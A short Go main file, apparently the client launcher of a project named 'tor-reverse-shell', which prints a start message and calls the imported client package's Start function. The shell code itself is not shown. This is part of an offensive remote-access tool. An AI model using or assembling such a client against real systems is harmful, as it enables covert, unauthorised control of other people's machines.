package main

import (
	"fmt"

	"github.com/humbertovnavarro/tor-reverse-shell/pkg/client"
)

func main() {
	fmt.Println("starting tshell client")
	err := client.Start()
	if err != nil {
		fmt.Println(err)
	}
}
